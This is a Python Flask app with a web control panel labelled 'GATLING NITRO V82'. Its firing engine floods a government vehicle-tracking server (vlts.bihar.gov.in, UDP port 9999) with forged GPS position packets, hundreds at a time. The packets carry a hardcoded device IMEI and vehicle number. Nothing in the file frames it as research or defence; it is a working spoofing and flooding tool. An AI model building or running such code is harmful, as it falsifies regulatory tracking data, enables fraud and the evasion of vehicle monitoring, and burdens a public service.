import os
import socket
import threading
import time
import requests
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# --- V82 Global State ---
status = {
    "firing": False,
    "count": 0,
    "tag": "EGAS",
    "imei": "862567075041793",
    "vno": "BR04GA5974",
    "portal_status": "Idle",
    "last_sync": "Never"
}

HTML_V82 = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 PRO - RENDER</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; text-align: center; }
        .container { border: 2px solid #00ff00; padding: 20px; display: inline-block; border-radius: 15px; background: #000; width: 95%; max-width: 450px; box-shadow: 0 0 20px #00ff00; }
        .metric { font-size: 45px; color: #fff; margin: 10px 0; text-shadow: 0 0 10px #00ff00; }
        input { width: 85%; padding: 12px; margin: 8px 0; background: #111; border: 1px solid #00ff00; color: #00ff00; border-radius: 5px; }
        .btn { padding: 15px; font-size: 20px; cursor: pointer; border: none; border-radius: 8px; width: 90%; margin-top: 10px; font-weight: bold; text-transform: uppercase; }
        .start { background: #006400; color: #fff; }
        .stop { background: #8b0000; color: #fff; }
        .status-box { background: #111; padding: 10px; margin-top: 15px; border-radius: 5px; font-size: 13px; text-align: left; }
        .label { color: #888; font-size: 11px; display: block; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>🔥 GATLING NITRO V82</h2>
        <div class="metric" id="count">0</div>
        
        <div class="status-box">
            <div>📡 Portal: <span id="p_stat" style="color:yellow">Waiting...</span></div>
            <div>🕒 Last Sync: <span id="l_sync">--:--</span></div>
        </div>

        <form action="/action" method="post">
            <label class="label">ENGINE TAG</label>
            <input type="text" name="tag" value="{{tag}}">
            <label class="label">DEVICE IMEI</label>
            <input type="text" name="imei" value="{{imei}}">
            <label class="label">VEHICLE NUMBER</label>
            <input type="text" name="vno" value="{{vno}}">
            
            <button class="btn start" name="btn" value="start">Activate Firing</button>
            <button class="btn stop" name="btn" value="stop">Emergency Stop</button>
        </form>
    </div>

    <script>
        function update() {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('count').innerText = d.count.toLocaleString();
                document.getElementById('p_stat').innerText = d.portal_status;
                document.getElementById('l_sync').innerText = d.last_sync;
                if(d.portal_status === "MATCHED - KILLING SESSION") {
                    document.getElementById('p_stat').style.color = "red";
                }
            });
        }
        setInterval(update, 2000);
    </script>
</body>
</html>
"""

def portal_monitor():
    """V82 Chrome/Requests Data Collector"""
    while True:
        if status["firing"]:
            try:
                # Simulaton of Chrome data collection
                now_str = datetime.now().strftime("%d-%m-%Y")
                # Yahan portal ka URL aur logic add kar sakte ho
                status["last_sync"] = datetime.now().strftime("%H:%M:%S")
                
                # V82 Kill Logic: Agar data match hua
                # if portal_date == now_str: 
                #     status["firing"] = False
                #     status["portal_status"] = "MATCHED - KILLING SESSION"
                
                status["portal_status"] = "Monitoring... No Match"
            except:
                status["portal_status"] = "Portal Error"
        time.sleep(5)

def firing_engine():
    """High Speed UDP Firing"""
    target = ("vlts.bihar.gov.in", 9999)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while status["firing"]:
        now = datetime.now()
        pkt = f"$PVT,{status['tag']},2.1.1,NR,01,L,{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},25.65,N,84.78,E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*".encode()
        
        # V82 Batch firing
        for _ in range(500):
            sock.sendto(pkt, target)
            status["count"] += 1
        time.sleep(0.01)
    sock.close()

@app.route('/')
def home():
    return render_template_string(HTML_V82, tag=status['tag'], imei=status['imei'], vno=status['vno'])

@app.route('/data')
def data():
    return jsonify(status)

@app.route('/action', methods=['POST'])
def action():
    val = request.form.get('btn')
    status['tag'] = request.form.get('tag')
    status['imei'] = request.form.get('imei')
    status['vno'] = request.form.get('vno')

    if val == "start" and not status["firing"]:
        status["firing"] = True
        status["count"] = 0 # Reset count on new start
        threading.Thread(target=firing_engine, daemon=True).start()
    elif val == "stop":
        status["firing"] = False
        status["portal_status"] = "Stopped"
    
    return home()

if __name__ == "__main__":
    # Start Portal Monitor in background
    threading.Thread(target=portal_monitor, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
